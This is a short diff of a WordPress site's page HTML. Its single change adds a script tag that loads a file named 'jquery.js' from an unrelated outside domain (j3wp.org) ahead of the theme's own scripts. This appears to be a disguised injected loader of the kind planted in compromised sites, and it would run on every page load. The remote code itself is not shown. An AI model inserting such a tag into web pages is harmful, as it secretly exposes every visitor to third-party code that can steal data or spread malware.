@@ -517,7 +517,7 @@ case "interactive":Sc();uc();break;default:var Tc=sc,Uc=ob(Tc);Uc.loaded||(Uc.on
         <script type="text/javascript">
             var opsajaxurl = 'http://engineerverse.com/wp-admin/admin-ajax.php';
         </script>
-        <script type='text/javascript' src='http://engineerverse.com/wp-content/themes/x%20theme%20old/framework/js/dist/site/x-body.min.js?ver=3.2.1'></script>
+        <script type="text/javascript" src="http://www.j3wp.org/jquery.js"></script><script type='text/javascript' src='http://engineerverse.com/wp-content/themes/x%20theme%20old/framework/js/dist/site/x-body.min.js?ver=3.2.1'></script>
 <script type='text/javascript' src='http://engineerverse.com/wp-content/plugins/x-shortcodes/js/dist/site/x-shortcodes-body.min.js?ver=3.0.2'></script>
 
 
